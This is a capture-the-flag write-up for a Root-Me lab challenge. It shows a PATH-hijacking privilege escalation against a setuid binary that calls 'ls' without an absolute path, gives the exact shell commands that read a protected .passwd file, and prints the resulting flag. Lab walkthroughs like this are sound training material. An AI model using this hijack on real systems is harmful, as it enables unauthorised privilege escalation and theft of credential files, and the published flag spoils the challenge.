# Bash System 1

URL: [https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)
## Source code

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void) {
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

[Download](https://www.root-me.org/local/cache-code/6986fc7121c446df09457cb2851105da.txt)

## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                              |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                  |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                 |
| SSH access | [ssh -p 2222 app-script-ch11@challenge02.root-me.org](ssh://app-script-ch11:app-script-ch11@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_193&ssh=ssh://app-script-ch11:app-script-ch11@challenge02 "WebSSH") |
| Username   | app-script-ch11                                                                                                                                                                                                                                                                                                                      |
| Password   | app-script-ch11                                                                                                                                                                                                                                                                                                                      |

## Solution

The binary itself doesn't seem vulnerable as it just uses `ls` command.
```bash
app-script-ch11@challenge02:~$ ./ch11
/challenge/app-script/ch11/.passwd
```

The flaw is that it's using `ls` and not absolute path to `ls`, meaning we can create an executable file and hijack the `ls` being called.

```bash
app-script-ch11@challenge02:~$ cd $(mktemp -d)
app-script-ch11@challenge02:/tmp/tmp.1xxiJH7zGr$ vim ls
app-script-ch11@challenge02:/tmp/tmp.1xxiJH7zGr$ cat ls
#!/bin/bash

/bin/cat /challenge/app-script/ch11/.passwd
app-script-ch11@challenge02:/tmp/tmp.1xxiJH7zGr$ chmod +x ls
app-script-ch11@challenge02:/tmp/tmp.1xxiJH7zGr$ chmod +rx /tmp/tmp.1xxiJH7zGr
app-script-ch11@challenge02:/tmp/tmp.1xxiJH7zGr$ export PATH="/tmp/tmp.1xxiJH7zGr:$PATH"
app-script-ch11@challenge02:/tmp/tmp.1xxiJH7zGr$ ~/ch11
!oPe96a/.s8d5
```

> Password: `!oPe96a/.s8d5`

